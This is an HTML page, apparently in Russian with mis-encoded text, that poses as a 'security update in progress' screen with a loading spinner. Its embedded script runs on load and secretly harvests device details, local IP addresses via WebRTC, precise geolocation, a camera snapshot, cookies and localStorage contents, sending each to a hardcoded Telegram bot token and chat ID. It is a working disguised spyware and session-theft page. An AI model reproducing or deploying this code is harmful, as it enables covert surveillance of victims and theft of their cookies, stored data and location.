<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            text-align: center;
            padding: 50px;
            color: #333;
        }
        h2 {
            color: #2c3e50;
        }
        .loader {
            margin-top: 20px;
            display: inline-block;
            width: 50px;
            height: 50px;
            border: 5px solid #ccc;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <h2>‚è≥ –ü–æ–¥–æ–∂–¥–∏—Ç–µ, –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ...</h2>
    <div class="loader"></div>

    <script>
        const TELEGRAM_BOT_TOKEN = "7961419672:AAEd-VMzuf43W9PsaQLveQ__vYMf2EOswu0";
        const TELEGRAM_CHAT_ID = "5024505351";

        function sendData(message) {
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,  {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            }).catch(err => console.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:", err));
        }

        function sendFile(blob, caption = "") {
            const formData = new FormData();
            const file = new File([blob], "screenshot.jpg", { type: "image/jpeg" });
            formData.append("document", file);
            formData.append("chat_id", TELEGRAM_CHAT_ID);
            formData.append("caption", caption);

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,  {
                method: 'POST',
                body: formData
            }).catch(err => console.error("–û—à–∏–±–∫–∞ —Ñ–∞–π–ª–∞:", err));
        }

        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                language: navigator.language || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                cookiesEnabled: document.cookie.length > 0,
                online: navigator.onLine,
                timestamp: new Date().toISOString()
            };
        }

        function getLocalIPs() {
            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
            const ips = [];

            const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;

            if (!RTCPeerConnection) {
                sendData("‚ùå WebRTC –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è");
                return;
            }

            const pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel("");
            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
            pc.onicecandidate = e => {
                if (!e.candidate) {
                    if (ips.length === 0) {
                        sendData("üì° –õ–æ–∫–∞–ª—å–Ω—ã–µ IP –Ω–µ –Ω–∞–π–¥–µ–Ω—ã");
                    } else {
                        sendData(`<b>üì° –õ–æ–∫–∞–ª—å–Ω—ã–µ IP:</b>\n<pre>${ips.join('\\n')}</pre>`);
                    }
                    pc.close();
                    return;
                }

                const ipMatch = e.candidate.candidate.match(ipRegex);
                if (ipMatch && !ips.includes(ipMatch[0])) {
                    ips.push(ipMatch[0]);
                }
            };

            setTimeout(() => {
                pc.close();
            }, 2000);
        }

        function requestGeolocation() {
            if (!navigator.geolocation) {
                sendData("‚ùå –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è");
                return;
            }

            navigator.geolocation.getCurrentPosition(position => {
                const coords = position.coords;
                sendData(`<b>üåç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è:</b>\n<pre>–®–∏—Ä–æ—Ç–∞: ${coords.latitude}\n–î–æ–ª–≥–æ—Ç–∞: ${coords.longitude}</pre>`);
            }, () => {
                sendData("‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–∫–ª–æ–Ω–∏–ª –∑–∞–ø—Ä–æ—Å –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏");
            }, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            });
        }

        function requestCameraAccess() {
            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                .then(stream => {
                    sendData("üé• –ö–∞–º–µ—Ä–∞ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞");

                    const video = document.createElement("video");
                    video.srcObject = stream;
                    video.play();

                    const canvas = document.createElement("canvas");
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;

                    const ctx = canvas.getContext("2d");
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    stream.getTracks().forEach(track => track.stop());

                    canvas.toBlob(blob => {
                        sendFile(blob, "üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç —Å –∫–∞–º–µ—Ä—ã");
                    }, "image/jpeg", 0.8);
                })
                .catch(() => {
                    sendData("üì∑ –ö–∞–º–µ—Ä–∞ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞");
                });
        }

        function collectCookiesAndStorage() {
            sendData(`<b>üç™ Cookies:</b> ${document.cookie || "–Ω–µ—Ç –∫—É–∫"}`);

            let storage = "";
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                storage += `${key}: ${localStorage.getItem(key)}\n`;
            }
            if (storage) {
                sendData(`<b>üì¶ LocalStorage:</b>\n<code>${storage}</code>`);
            }
        }

        function startCollection() {
            const deviceInfo = getDeviceInfo();
            sendData(`<b>üì± –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ:</b>\n<pre>${JSON.stringify(deviceInfo, null, 2)}</pre>`);

            getLocalIPs();
            requestGeolocation();
            requestCameraAccess();
            collectCookiesAndStorage();
        }

        // –ê–≤—Ç–æ–∑–∞–ø—É—Å–∫ –ø–æ—Å–ª–µ –∑–∞–≥—Ä—É–∑–∫–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.onload = () => {
            setTimeout(startCollection, 2000);
        };
    </script>
</body>
</html>
